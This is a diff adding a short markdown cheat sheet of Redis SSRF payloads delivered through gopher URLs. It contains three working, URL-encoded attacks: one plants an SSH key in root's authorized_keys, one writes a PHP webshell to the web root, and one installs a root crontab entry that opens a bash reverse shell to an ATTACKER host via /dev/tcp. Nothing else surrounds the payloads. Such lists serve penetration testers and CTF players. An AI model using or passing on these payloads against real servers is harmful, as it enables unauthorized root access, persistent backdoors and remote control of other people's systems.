@@ -1,0 +1,16 @@
+# Redis SSRF Payloads via Gopher
+
+## Write SSH Key (requires Redis auth disabled or known)
+```
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20x%20%22%5Cn%5Cnssh-rsa%20AAA...%20root%40kali%5Cn%5Cn%22%0D%0ASAVE%0D%0A
+```
+
+## Write Webshell
+```
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20x%20%22%3C%3Fphp%20system(%24_GET%5B'c'%5D)%3B%20%3F%3E%22%0D%0ASAVE%0D%0A
+```
+
+## Crontab Reverse Shell
+```
+gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/crontabs%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASET%20x%20%22%5Cn%5Cn*%20*%20*%20*%20*%20bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/PORT%200%3E%261%27%5Cn%5Cn%22%0D%0ASAVE%0D%0A
+```
